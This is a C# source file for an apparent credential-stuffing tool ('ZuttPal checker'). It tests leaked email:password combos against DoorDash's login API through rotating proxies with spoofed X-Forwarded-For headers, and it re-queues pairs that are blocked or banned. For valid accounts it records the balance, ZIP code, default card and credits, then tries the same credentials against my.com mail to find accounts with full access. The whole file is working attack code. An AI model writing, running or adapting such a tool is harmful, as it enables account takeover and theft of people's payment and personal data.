using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
using StringContent = System.Net.Http.StringContent;

namespace ZuttPal
{
	internal class check14
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking12.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking12.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking12.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								var random = new Random();
								int s1 = random.Next(255);
								int s2 = random.Next(255);
								int s3 = random.Next(255);
								int s4 = random.Next(255);
								httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
								httpRequest.AddHeader("X-Forwarded-For", $"{s1}.{s2}.{s3}.{s4}");
								string text5 = httpRequest.Post("https://api.doordash.com/v2/auth/web_login/", $"email={email}&password={password}", "application/x-www-form-urlencoded").ToString();
							    if (text5.Contains("Incorrect username or password"))
								{
									Interlocked.Increment(ref Checking12.CheckedLines);
									Interlocked.Increment(ref Checking12.currentCpm);
									Interlocked.Increment(ref Checking12.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
								}
								if (text5.Contains("last_name") || text5.Contains("account_credits"))
								{
									Interlocked.Increment(ref Checking12.CheckedLines);
									Interlocked.Increment(ref Checking12.currentCpm);
									Interlocked.Increment(ref Checking12.Hits);
									Save(Path + "\\Hits.txt", account);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									string bal = Regex.Match(text5, "account_credits\":(.*?),").Groups[1].Value.ToString();
									string zip = Regex.Match(text5, "zip_code\":\"(.*?)\"").Groups[1].Value.ToString();
									string card = Regex.Match(text5, "default_card\":(.*?),").Groups[1].Value.ToString();
									string credits = Regex.Match(text5, "account_credits\":(.*?),").Groups[1].Value.ToString();
									string str3 = "False";
									if (MailAccessCheck(email, password) == "Working")
										str3 = "True";
									string yes = account + " [Balance: " + bal + " | Full Access: " + str3 + " | ZIP: " + zip + " | Defualt Card: " + card + " | Credits: " + credits + "]";
									//string yes = account + "[Balance: Full Access: " + str3 + "]";
									Save(Path + "\\Capture Hits.txt", yes);
									break;
								
								}
								else if (text5.Contains("Incorrect username or password"))
								{
									Interlocked.Increment(ref Checking12.CheckedLines);
									Interlocked.Increment(ref Checking12.currentCpm);
									Interlocked.Increment(ref Checking12.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
								}
								else if (text5.Contains("Login banned due to violation of terms of service"))
								{
									string acc1 = email + ":" + password;
									Checking12.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking12.retry);
									break;
								}
								else if (text5.Contains("<title>406 Not Acceptable</title><"))
								{
									string acc1 = email + ":" + password;
									Checking12.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking12.retry);
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking12.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking12.retry);
								break;
							}
						}	
					}
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Proxy = Checking12.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Checking12.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Checking12.retry);
					break;
				}
			}
			return "";
		}

		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
